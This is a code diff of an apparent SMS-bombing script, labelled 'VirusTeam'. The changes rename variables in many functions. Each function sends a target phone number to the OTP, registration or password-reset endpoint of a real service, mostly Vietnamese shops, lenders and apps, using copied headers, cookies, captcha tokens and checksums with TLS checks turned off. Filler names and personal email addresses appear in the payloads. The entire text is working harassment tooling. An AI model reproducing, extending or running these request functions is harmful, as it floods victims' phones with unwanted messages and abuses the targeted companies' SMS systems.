-        'account': phone,
+        'account': sdt_vs,
         'password': 'tmrvirus@080',
         'confirmPassword': 'tmrvirus@080',
         'recaptcha': '03AFcWeA7k7xTO-mWbrjVz2PZ9x-n9aq6g1xwVO4rLyuQdURsV9tGIC8J3GO2KbrsA0-Sm9xcvRH5VmR75FY-2FDO2GV3Iy_ZIIH8F-8RdvFMl2Um9qdr9Zsyrf7zDrw6QCA7yDSo0lHfSO_Ja1hcoHodAjUIIXI52Gqfr9nJGotdUiNuobzxW1ADC4_1y9zRUdCNZVobRZfR_eE-ZA2r_PbXoWLhp5KzeLWWXIT6Al15ZdSeC5AfGzs1pVYO9a2ZuW3x4vFYU_Z7Jfl784gjS8EMAQpCZSHcxx9c6dvTZNRliFjymEWyD6ps09g9wFg1SoYjRrSjqMOlZijxS04RQ5UalO4DW1JVF4jYq5OMX0GXD-R6-S1_M9KBTN46B4HYnww_PPv5cauuWtBNwoWik8IInjUr_TdqIH2h__vXukXMt-fs7LJll_rHKQVtjJT3IQBWHbPOTSfAk7ehHFg5Zi7TgHaJsrdjej4T8fN53cqXV9Mu9utFNpOK7Fdrk9_iaUWPewcZ3QukyzVRCD--v5rnw58hM493AamrQsYbqrcOL6fOK-8nO6Ps2M7k-nfLOdN9vYyYpl4w1xvQfjw3oJ2UUwy4ANKHPTM2_B4FyVru8fhyGdwM367t2E3mliLsz2A0HzKzGBk3A51f8KY_c0CDjMbRitcMFHsdQkjuRgGi69tfQ_nPaWAU5ox7nvjeDzBBW6ojQMz2iHciPtsKISt5_pkDJ5BW9W38GqAvUqz48JQPuXa6LQwfaFWvfN5nCTu4ru4mLyjqR_th7DS2A3USqmIMAbMDtXL2oyCMk_OBmQoQv9T2_cqBWCemjTmKOCdAeBK18MNW2ugpnIN0lDUtxqFUVRYKRWiQIv75QQXoe8xO4uXxBb8Ee95pCQIeaRWL2G5lvj5z1P4jiKUJ_8EK5yFYp1y_utA8NIJ6sZNyxA8BW2X1NcqJM4NaDDhDP4MaAHFqNbmlX7rQvJjLJd_PviL855FMVuF6lFGAY2l3p8SLrGYnqH4RWg1bMU_Hu1cLdmLSD6eA4BsrkIXpTyXGQLL97GBoYgARVdvgofYSz7pVwicRPUXfkMzLo4TF-HFsAcI91-RFB3ZTKXJUsKEbmIA_BRBY4oWAYCsnFVW_cTGCaaRpECLOF06bAjjoDokEizIEXKO1rDgbl-30kjfM29Yp9QY8FC_NaUEcRQvGF4JB6bAhEU3mL3lvu1Y5AcvtCJyKHcf5due0hnZun1vAaHoY5OscicczZIRl2ldGrwpy1PmlEbkQuU9aAYwebMF9X6vaVPZmf8qYRB467_r31Y4maNgVET7I520vabSTd0S3BQ5cAiB4JhMoKUO5Ky_OtVlHezMdx20CVXxtDXFf4gHpQYRkOCwxcNvvZQZrtcI52wDXCc_oK3ze9zVCrD0249gMiy9YapELDGBSQ6IEd42WJdZWON1kDK5Gj9FM0RVkhnwovPHUUo3iwBzZMfAYivDvnkIA9dKyR8fJ55tWcUmL5INvpAxu2WQE5DIIYDwVa2UTd4k1XI-vgiV_zSsY7hMcCPhHDsyDGyz2avKG5QhFgzxp8Womf715LS8ZopD4M0GNnUptiRxKb3VQt1wkhfGtCjXYolZX8YJ12X4y3abYOf65A4w',
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests22(phone):
-    url = 'https://v9-cc.800best.com/uc/account/sendSignUpCode'
+def VsTeamHttpRequests22(sdt_vs):
+    VirusTeam_Url = 'https://v9-cc.800best.com/uc/account/sendSignUpCode'
     headers = {
         "host": "v9-cc.800best.com",
         "connection": "keep-alive",
@@ -903,16 +903,16 @@ def VsTeamHttpRequests22(phone):
         
     }
     payload = {
-    "phoneNumber": phone,
+    "phoneNumber": sdt_vs,
     "verificationCodeType": 1
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests23(phone):
-    url = 'https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN'
+def VsTeamHttpRequests23(sdt_vs):
+    VirusTeam_Url = 'https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN'
     headers = {
         "host": "api.alfrescos.com.vn",
         "connection": "keep-alive",
@@ -937,19 +937,19 @@ def VsTeamHttpRequests23(phone):
         
     }
     payload = {
-    "phoneNumber": phone,
+    "phoneNumber": sdt_vs,
     "secureHash": "957ca29d8658907bcc2774e88fbb7f10",
     "deviceId": "",
     "sendTime": 1719577052938,
     "type": 1
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests24(phone):
-    url = 'https://api.popeyes.vn/api/v1/register'
+def VsTeamHttpRequests24(sdt_vs):
+    VirusTeam_Url = 'https://api.popeyes.vn/api/v1/register'
     headers = {
         "host": "api.popeyes.vn",
         "content-length": "116",
@@ -977,19 +977,19 @@ def VsTeamHttpRequests24(phone):
         "_gcl_au": "1.1.1990400277.1719576270.738059699.1719576310.1719576309"
     }
     payload = {
-    "phone": phone,
+    "phone": sdt_vs,
     "firstName": "Virus",
     "lastName": "Tmr",
     "email": "raofficialvirus@gmail.com",
     "password": "123456@"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests25(phone):
-    url = 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=4V80j5oPKflEHjnGdLHRRw&e=1719581114&device=Chrome(version%253A126.0.0.0)&drm=1'
+def VsTeamHttpRequests25(sdt_vs):
+    VirusTeam_Url = 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=4V80j5oPKflEHjnGdLHRRw&e=1719581114&device=Chrome(version%253A126.0.0.0)&drm=1'
     headers = {
         "host": "api.fptplay.net",
         "content-length": "89",
@@ -1013,17 +1013,17 @@ def VsTeamHttpRequests25(phone):
         
     }
     payload = {
-    "phone": phone,
+    "phone": sdt_vs,
     "country_code": "VN",
     "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests26(phone):
-    url = 'https://api.ahamove.com/api/v3/public/user/register'
+def VsTeamHttpRequests26(sdt_vs):
+    VirusTeam_Url = 'https://api.ahamove.com/api/v3/public/user/register'
     headers = {
         "host": "api.ahamove.com",
         "content-length": "490",
@@ -1046,7 +1046,7 @@ def VsTeamHttpRequests26(phone):
         
     }
     payload = {
-    "mobile": phone,
+    "mobile": sdt_vs,
     "name": "Tmr Virus",
     "email": "123@tmr.gov.vn",
     "country_code": "VN",
@@ -1054,19 +1054,19 @@ def VsTeamHttpRequests26(phone):
     "time": 1719577743,
     "checksum": "OkUnoWuAtYBz2UblvNdpYEwAvOlbbNHgow/ATrGrKuNG6JpCkCyYcleAyvdQsAjvKec56Kb1/5b9EZAMWeBrgvY78r8o81CBZ57hRRlJIyexteI8u6o9MfB6UKTaupTB7+G3qqdUr/tpOFzYE/3LB4oQCDIcpp8maSzyH8y3XDjvZiDpd2Cuh7K/M1TbtQWNukbbmOKf0aS6HJf0ubUwjJFtA/ofyzkV2LMGzk9R7tM13/aldwQA5wacCweoq0aToFBoeTpjMZETKt7cjMYCleP/fJ1om8pBQbPwKWjV0qbzwtzsS8Tcjxi6M7wje+gxj5no2bEakA0DZcW5HfkBOA=="
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests27(phone):
+def VsTeamHttpRequests27(sdt_vs):
     Batdongsan_Api = f'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister'
     params = {
-        'phoneNumber': phone
+        'phoneNumber': sdt_vs
     }
     response = requests.get(Batdongsan_Api, params=params)
-def VsTeamHttpRequests28(phone):
-    url = 'https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1'
+def VsTeamHttpRequests28(sdt_vs):
+    VirusTeam_Url = 'https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1'
     headers = {
         "host": "meta.vn",
         "content-length": "80",
@@ -1100,18 +1100,18 @@ def VsTeamHttpRequests28(phone):
     }
     payload = {
     "api_args": {
-        "lgUser": phone,
+        "lgUser": sdt_vs,
         "type": "phone"
     },
     "api_method": "CheckRegister"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests29(phone):
-    url = 'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification'
+def VsTeamHttpRequests29(sdt_vs):
+    VirusTeam_Url = 'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification'
     headers = {
         "host": "beautybox-api.hsv-tech.io",
         "content-length": "30",
@@ -1136,15 +1136,15 @@ def VsTeamHttpRequests29(phone):
         
     }
     payload = {
-    "phoneNumber": "84" + phone
+    "phoneNumber": "84" + sdt_vs
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests30(phone):
-    url = 'https://shop.login.net.vn/apimobi/v1/check-phone'
+def VsTeamHttpRequests30(sdt_vs):
+    VirusTeam_Url = 'https://shop.login.net.vn/apimobi/v1/check-phone'
     headers = {
         "host": "shop.login.net.vn",
         "content-length": "16",
@@ -1172,15 +1172,15 @@ def VsTeamHttpRequests30(phone):
         "_ga_5KED5SHEXB": "GS1.1.1719677559.1.1.1719677575.0.0.0"
     }
     payload = {
-        "phone": phone
+        "phone": sdt_vs
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, data=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests31(phone):
-    url = 'https://www.fahasa.com/ajaxlogin/ajax/checkPhone'
+def VsTeamHttpRequests31(sdt_vs):
+    VirusTeam_Url = 'https://www.fahasa.com/ajaxlogin/ajax/checkPhone'
     headers = {
         "host": "www.fahasa.com",
         "content-length": "16",
@@ -1213,15 +1213,15 @@ def VsTeamHttpRequests31(phone):
         "_clck": "10eqfbq%7C2%7Cfn1%7C0%7C1641"
     }
     payload = {
-        "phone": phone
+        "phone": sdt_vs
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, data=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests32(phone):
-    url = 'https://www.pnj.com.vn/customer/otp/request'
+def VsTeamHttpRequests32(sdt_vs):
+    VirusTeam_Url = 'https://www.pnj.com.vn/customer/otp/request'
     headers = {
         "host": "www.pnj.com.vn",
         "content-length": "73",
@@ -1272,18 +1272,18 @@ def VsTeamHttpRequests32(phone):
     }
     payload = {
         "_token": "CMZ0cnrCLwVFoMzFlYxXVpMCQilCXoTGKqAgLOfc",
-        "phone": phone,
+        "phone": sdt_vs,
         "type": "zns"
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, data=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests33(phone):
-    if len(phone) == 10 and phone.startswith('0'):
-        phone = '+84' + phone[1:]
-    url = 'https://app-api.selly.vn/users/request-otp'
+def VsTeamHttpRequests33(sdt_vs):
+    if len(sdt_vs) == 10 and sdt_vs.startswith('0'):
+        sdt_vs = '+84' + sdt_vs[1:]
+    VirusTeam_Url = 'https://app-api.selly.vn/users/request-otp'
     headers = {
         "host": "app-api.selly.vn",
         "connection": "keep-alive",
@@ -1312,19 +1312,19 @@ def VsTeamHttpRequests33(phone):
     }
     cookies = {}
     payload = {
-        "phone": phone,
+        "phone": sdt_vs,
         "forceSendSms": True,
         "checksum": "14ec77936191e28d94237d51cabd630dd6f9adc7"
     }
     
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests34(phone):
-    url = 'https://api.vayvnd.vn/v2/users/password-reset'
+def VsTeamHttpRequests34(sdt_vs):
+    VirusTeam_Url = 'https://api.vayvnd.vn/v2/users/password-reset'
     headers = {
         "host": "api.vayvnd.vn",
         "content-length": "102",
@@ -1362,16 +1362,16 @@ def VsTeamHttpRequests34(phone):
         "_ga_P2783EHVX2": "GS1.1.1719704137.3.1.1719704156.41.0.0"
     }
     payload = {
-    "login": phone,
+    "login": sdt_vs,
     "trackingId": "Y7Gqciut3EbiQWG3I23lY6HLTjCGUEpzNgHvj82E1V8viOPh631MvqpPmLFPDYNY"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests35(phone):
-    url = "https://moneyveo.vn/vi/registernew/resendsmstokenjson/"
+def VsTeamHttpRequests35(sdt_vs):
+    VirusTeam_Url = "https://moneyveo.vn/vi/registernew/resendsmstokenjson/"
     headers = {
         "Host": "moneyveo.vn",
         "content-length": "24",
@@ -1403,15 +1403,15 @@ def VsTeamHttpRequests35(phone):
         ),
         "priority": "u=1, i"
     }
-    payload = {"phoneNumber": phone}
+    payload = {"phoneNumber": sdt_vs}
 
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers={k: str(v).encode('latin-1', 'replace').decode('latin-1') for k, v in headers.items()}, data=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers={k: str(v).encode('latin-1', 'replace').decode('latin-1') for k, v in headers.items()}, data=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests36(phone):
-    url = 'https://gateway.chotot.com/v2/public/auth/send_otp_verify'
+def VsTeamHttpRequests36(sdt_vs):
+    VirusTeam_Url = 'https://gateway.chotot.com/v2/public/auth/send_otp_verify'
     headers = {
         'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
         'sec-ch-ua-platform': '"Android"',
@@ -1429,28 +1429,28 @@ def VsTeamHttpRequests36(phone):
         'priority': 'u=1, i'
     }
     payload = {
-        "phone": phone,
+        "phone": sdt_vs,
         "type": ""
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests37(phone):
-    Topenland_Api = f'https://topenland.com/_next/data/vDnYyjJ7yIDCaHNQ78kco/vi/sign-up/verify-otp.json?phoneNumber={phone}'
+def VsTeamHttpRequests37(sdt_vs):
+    Topenland_Api = f'https://topenland.com/_next/data/vDnYyjJ7yIDCaHNQ78kco/vi/sign-up/verify-otp.json?phoneNumber={sdt_vs}'
     VirusTeam_PhanHoiTuWeb = requests.get(Topenland_Api)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests38(phone):
-    url = 'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php'
+def VsTeamHttpRequests38(sdt_vs):
+    VirusTeam_Url = 'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php'
     ngaunhien = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
     hoten = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
-    phone = '0' + phone
-    phone = phone.replace('00', '')
-    phone1 = '+84' + phone
+    sdt_vs = '0' + sdt_vs
+    sdt_vs = sdt_vs.replace('00', '')
+    sdt_vs1 = '+84' + sdt_vs
     headers = {
         'authority': 'www.kiotviet.vn',
         'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -1494,25 +1494,25 @@ def VsTeamHttpRequests38(phone):
         '_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',
     }
     payload = {
-        'phone': phone1,
+        'phone': sdt_vs1,
         'code': ngaunhien,
         'name': 'Tmr Virus',
         'email': '',
         'zone': 'An Giang - Huyện Châu Phú',
         'merchant': 'muabansi',
-        'username': phone,
+        'username': sdt_vs,
         'industry': 'Ngành hàng bán lẻ',
         'ref_code': '746',
         'industry_id': '77',
-        'phone_input': phone,
+        'phone_input': sdt_vs,
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, cookies=cookies, headers=headers, data=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, cookies=cookies, headers=headers, data=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests39(phone):
-    url = 'https://routine.vn/customer/otp/send/'
+def VsTeamHttpRequests39(sdt_vs):
+    VirusTeam_Url = 'https://routine.vn/customer/otp/send/'
     headers = {
         "host": "routine.vn",
         "content-length": "39",
@@ -1564,16 +1564,16 @@ def VsTeamHttpRequests39(phone):
         "section_data_ids": "%7B%22customer%22%3A1719716244%7D"
     }
     payload = {
-        "telephone": phone,
+        "telephone": sdt_vs,
         "isForgotPassword": "0"
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests40(phone):
-    url = f'https://vercel.com/api/v2/registration/start-verify-phone?email=duongbatuan87%40gmail.com&phone={phone}&country=vn'
+def VsTeamHttpRequests40(sdt_vs):
+    VirusTeam_Url = f'https://vercel.com/api/v2/registration/start-verify-phone?email=duongbatuan87%40gmail.com&phone={sdt_vs}&country=vn'
     headers = {
         "host": "vercel.com",
         "content-length": "0",
@@ -1606,13 +1606,13 @@ def VsTeamHttpRequests40(phone):
         "ko_sid": "{%22id%22:%221719808513901%22%2C%22lastTouched%22:1719808578045}"
     }
     payload = None
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests41(phone):
-    url = 'https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd'
+def VsTeamHttpRequests41(sdt_vs):
+    VirusTeam_Url = 'https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd'
     headers = {
         "host": "api-crownx.winmart.vn",
         "content-length": "25",
@@ -1636,15 +1636,15 @@ def VsTeamHttpRequests41(phone):
         
     }
     payload = {
-    "userName": phone
+    "userName": sdt_vs
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests42(phone):
-    url = 'https://api.vietlott-sms.vn/mobile-api/register/registerWithPhoneNumber'
+def VsTeamHttpRequests42(sdt_vs):
+    VirusTeam_Url = 'https://api.vietlott-sms.vn/mobile-api/register/registerWithPhoneNumber'
     headers = {
         "host": "api.vietlott-sms.vn",
         "connection": "keep-alive",
@@ -1672,14 +1672,14 @@ def VsTeamHttpRequests42(phone):
         
     }
     payload = {
-    "phoneNumber": phone
+    "phoneNumber": sdt_vs
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests43(phone):
+def VsTeamHttpRequests43(sdt_vs):
   cookies = {
     '_gcl_au': '1.1.713290776.1691278322',
     '_gid': 'GA1.2.538313268.1691278323',
@@ -1707,11 +1707,11 @@ def VsTeamHttpRequests43(phone):
   }
   data = {
     'action': 'verify-registration-info',
-    'phoneNumber': f'{phone}',
+    'phoneNumber': f'{sdt_vs}',
     'refCode': '',
   }
   response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data).json()
-def VsTeamHttpRequests44(phone):
+def VsTeamHttpRequests44(sdt_vs):
   headers = {
     'Host': 'y360.vn',
     # 'content-length': '22',
@@ -1728,10 +1728,10 @@ def VsTeamHttpRequests44(phone):
     'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
     # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _gat_gtag_UA_211029013_1=1; _fbp=fb.1.1691134636760.1633963715; _ga=GA1.1.329512893.1691134633; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691134646.0.0.0; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691134667.0.0.0',
     }
-  data = '{"phone":"phone"}'.replace("phone",phone)
+  data = '{"phone":"sdt_vs"}'.replace("sdt_vs",sdt_vs)
   response = requests.post('https://y360.vn/api/v1/user/register', data=data, headers=headers).json()
-def VsTeamHttpRequests45(phone):
-    url = 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification'
+def VsTeamHttpRequests45(sdt_vs):
+    VirusTeam_Url = 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification'
     headers = {
         "host": "api.nhathuoclongchau.com.vn",
         "content-length": "60",
@@ -1757,16 +1757,16 @@ def VsTeamHttpRequests45(phone):
 
     }
     payload = {
-    "phoneNumber": phone,
+    "phoneNumber": sdt_vs,
     "otpType": 1,
     "fromSys": "WEBKHLC"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests46(phone):
+def VsTeamHttpRequests46(sdt_vs):
   headers = {
     'Host': 'vi.appota.com',
     # 'content-length': '23',
@@ -1784,10 +1784,10 @@ def VsTeamHttpRequests46(phone):
     # 'cookie': '_gid=GA1.2.794950800.1691145824; _ga_SQM4TCSQGX=GS1.1.1691145825.1.1.1691145870.0.0.0; pay_session=eyJpdiI6IkRieTVpNm1rTVVjWElNNnNoRENVVVE9PSIsInZhbHVlIjoiVTdCSTdYQ0gyM2Z2UFlkbStCaWtldjNGdlpsSm5lRk9kNVpMbkQxTysydGNPSGhXSk9CT0xmNVhReUp4TXVkaTQ2XC9PYTZrRUZUSE1kXC9Jbm1WbTNuUT09IiwibWFjIjoiNjAxYTBhMjlhYWE0N2RiMTA3ZTg5MGZjOWNjZmVlOWM1MzNkMjhlZGI0NjNmMGYxYmVhNGI5MWM3MmZiZGU1MSJ9; _ga=GA1.2.626969575.1691145824; _gat=1; _fbp=fb.1.1691145877829.1126099989; _ga_8W5EGNGFDP=GS1.2.1691145878.1.0.1691145878.0.0.0',
   }
   data = {
-    'phone_number': f'{phone}',
+    'phone_number': f'{sdt_vs}',
   }
   response = requests.post('https://vi.appota.com/check-phone-register.html',data=data,headers=headers).text
-def VsTeamHttpRequests47(phone):
+def VsTeamHttpRequests47(sdt_vs):
   cookies = {
     '_ga': 'GA1.1.1928856259.1691039310',
     'serverChoice': 'Server-IPv1',
@@ -1813,18 +1813,18 @@ def VsTeamHttpRequests47(phone):
